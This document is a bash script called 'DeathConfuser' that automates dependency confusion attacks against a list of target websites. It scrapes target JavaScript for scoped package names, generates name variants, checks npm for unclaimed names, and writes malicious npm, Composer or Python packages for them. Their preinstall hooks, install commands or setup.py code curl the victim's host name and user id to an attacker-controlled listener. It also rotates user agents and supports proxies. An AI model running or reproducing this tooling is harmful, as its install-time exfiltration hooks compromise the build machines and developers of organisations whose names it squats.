#!/bin/bash

# DeathConfuser Beta  
# Ultra-featured multi-target dependency confusion automation
# Usage: ./deathconfuser_beta.sh targets.txt [--listener URL] [--tech tech] [--no-logs] [--config file] 

set -euo pipefail
IFS=$'\n\t'

LISTENER_URL="http://your.oast.fun"
UA_LIST=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
)
TMPDIR=$(mktemp -d)
CONCURRENT=10
LOGGING=true
CONFIG_FILE=""
TECH_OVERRIDE=""
REQUEST_DELAY=0
PROXY_CMD=""
CI_MODE=false

# Parse config if present
function load_config() {
  if [ -f "$CONFIG_FILE" ]; then
    LISTENER_URL=$(jq -r '.listener_url' "$CONFIG_FILE" || echo "$LISTENER_URL")
    CONCURRENT=$(jq -r '.concurrent // 10' "$CONFIG_FILE")
    TECH_OVERRIDE=$(jq -r '.tech_override // ""' "$CONFIG_FILE")
    REQUEST_DELAY=$(jq -r '.request_delay // 0' "$CONFIG_FILE")
    PROXY_CMD=$(jq -r '.proxy_cmd // ""' "$CONFIG_FILE")
  fi
}

# --- ARG PARSING ---
while [[ $# -gt 0 ]]; do
  key="$1"
  case $key in
    --listener)
      LISTENER_URL="$2"
      shift 2
      ;;
    --tech)
      TECH_OVERRIDE="$2"
      shift 2
      ;;
    --no-logs)
      LOGGING=false
      shift
      ;;
    --config)
      CONFIG_FILE="$2"
      load_config
      shift 2
      ;;
    --ci)
      CI_MODE=true
      shift
      ;;
    *)
      if [ -z "${TARGET_FILE:-}" ]; then
        TARGET_FILE="$1"
      fi
      shift
      ;;
  esac
done

if [ -z "${TARGET_FILE:-}" ]; then
  echo "Usage: $0 targets.txt [--listener URL] [--tech tech] [--no-logs] [--config file]"
  exit 1
fi

mkdir -p results payloads logs

function cleanup() {
  rm -rf "$TMPDIR"
}
trap cleanup EXIT

function log() {
  $LOGGING && echo "[$(date +'%H:%M:%S')] $*"
}

function urljoin() {
  python3 -c "from urllib.parse import urljoin; import sys; print(urljoin(sys.argv[1], sys.argv[2]))" "$1" "$2"
}

function random_ua() {
  echo "${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"
}

function curlx() {
  local args=("$@")
  if [[ -n "$PROXY_CMD" ]]; then
    eval "$PROXY_CMD curl -sLk -A \"$(random_ua)\" \"${args[*]}\""
  else
    curl -sLk -A "$(random_ua)" "${args[@]}"
  fi
}

function detect_tech() {
  if [ -n "$TECH_OVERRIDE" ]; then
    echo "$TECH_OVERRIDE"
    return
  fi

  local url=$1
  local headers body xpb meta_gen tech
  headers=$(curlx -I "$url")
  body=$(curlx "$url")

  xpb=$(echo "$headers" | grep -i 'x-powered-by:' || true)
  meta_gen=$(echo "$body" | grep -i '<meta name="generator"' || true)

  if echo "$xpb" | grep -iq express; then
    tech="Node.js (Express)"
  elif echo "$xpb" | grep -iq php; then
    tech="PHP"
  elif echo "$xpb" | grep -iq django; then
    tech="Python (Django)"
  elif echo "$xpb" | grep -iq laravel; then
    tech="PHP (Laravel)"
  elif echo "$xpb" | grep -iq rails; then
    tech="Ruby on Rails"
  elif echo "$xpb" | grep -iq spring; then
    tech="Java (Spring)"
  else
    if echo "$body" | grep -iq "react" && echo "$body" | grep -iq "node_modules"; then
      tech="Node.js (SSR)"
    elif echo "$body" | grep -iq "wp-content" || echo "$meta_gen" | grep -iq wordpress; then
      tech="PHP (WordPress)"
    elif echo "$body" | grep -iq "next"; then
      tech="Node.js (Next.js)"
    elif echo "$body" | grep -iq "rails"; then
      tech="Ruby on Rails"
    elif echo "$body" | grep -iq "spring"; then
      tech="Java (Spring)"
    else
      tech="Unknown"
    fi
  fi
  echo "$tech"
}

function generate_name_variants() {
  local pkg=$1
  echo "$pkg"
  echo "${pkg}-internal"
  echo "${pkg}-dev"
  echo "${pkg}-logger"
  echo "${pkg}-metrics"
  echo "${pkg//\//@internal/}"
}

function npm_check_package() {
  local pkg=$1
  local esc_pkg=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$pkg")
  local tries=3
  for ((i=1;i<=tries;i++)); do
    code=$(curlx -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$esc_pkg" || echo 000)
    [ "$code" = "404" ] && echo "unclaimed" && return
    [ "$code" = "200" ] && echo "claimed" && return
    sleep 1
  done
  echo "error"
}

function create_payload() {
  local tech=$1
  local pkg=$2
  local dir=$3
  mkdir -p "$dir"

  local author="John Haxor"
  local email="john.haxor@example.com"

  case "$tech" in
    *Node.js*)
      cat <<EOF > "$dir/package.json"
{
  "name": "$pkg",
  "version": "1.0.0",
  "author": "$author",
  "email": "$email",
  "scripts": {
    "preinstall": "curl --data-urlencode 'd=\$(hostname)-\$(id -u)' $LISTENER_URL"
  }
}
EOF
      echo "npm publish $dir" > "$dir/publish.sh"
      ;;
    *PHP*)
      cat <<EOF > "$dir/composer.json"
{
  "name": "$pkg",
  "description": "dependency confusion test",
  "authors": [{"name": "$author", "email": "$email"}],
  "scripts": {
    "pre-install-cmd": [
      "curl --data-urlencode 'd=\$(hostname)-\$(id -u)' $LISTENER_URL"
    ]
  }
}
EOF
      ;;
    *Django*|*Python*)
      cat <<EOF > "$dir/setup.py"
from setuptools import setup
import os
os.system("curl --data-urlencode 'd=\"{}\"' $LISTENER_URL".format(os.uname()[1]))

setup(
  name='$pkg',
  version='1.0',
  packages=[],
  author='$author',
  author_email='$email'
)
EOF
      ;;
    *)
      echo "$pkg" > "$dir/name.txt"
      ;;
  esac
}

function scan_target() {
  local target=$1
  local safe_domain=$(echo "$target" | sed 's|https\?://||;s|/.*||g')
  local target_dir="results/$safe_domain"
  local js_dir="$target_dir/jsdump"
  mkdir -p "$js_dir"

  log "[$safe_domain] Fetching main page..."
  local page_source
  page_source=$(curlx "$target")

  sleep $REQUEST_DELAY
  log "[$safe_domain] Extracting JS links..."
  local js_links
  js_links=$(echo "$page_source" | grep -Eo '<script[^>]+src="[^"]+\.js"' | grep -Eo 'src="[^"]+"' | cut -d'"' -f2 | sort -u)

  for js in $js_links; do
    local full_js=$(urljoin "$target" "$js")
    curlx "$full_js" -o "$js_dir/$(basename "$js")" &
  done
  wait

  local potentials=$(grep -oE "@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+" "$js_dir"/*.js 2>/dev/null | sort -u || true)

  local tech=$(detect_tech "$target")
  echo "$tech" > "$target_dir/tech.txt"
  log "[$safe_domain] Detected tech: $tech"

  mkdir -p "payloads/$safe_domain"
  mkdir -p "$target_dir/payloads"
  local vuln_json="{\"vulnerabilities\": []}"

  for pkg in $potentials; do
    for variant in $(generate_name_variants "$pkg"); do
      status=$(npm_check_package "$variant")
      if [ "$status" = "unclaimed" ]; then
        log "[$safe_domain] Unclaimed: $variant"
        create_payload "$tech" "$variant" "payloads/$safe_domain/$(echo "$variant" | sed 's|[@/]|-|g')"
        vuln_json=$(echo "$vuln_json" | jq ".vulnerabilities += [{\"package\": \"$variant\", \"status\": \"unclaimed\", \"tech\": \"$tech\"}]")
      fi
      sleep $REQUEST_DELAY
    done
  done

  echo "$vuln_json" > "$target_dir/vulns.json"
  log "[$safe_domain] Scan complete."
}

function main() {
  log "[*] Starting DeathConfuser v4..."
  log "[*] Listener URL: $LISTENER_URL"
  log "[*] Targets: $(wc -l < "$TARGET_FILE")"

  while IFS= read -r target || [ -n "$target" ]; do
    [ -z "$target" ] && continue
    scan_target "$target"
  done < "$TARGET_FILE"

  $CI_MODE && echo "::set-output name=status::success"
  log "[*] All targets processed."
}

main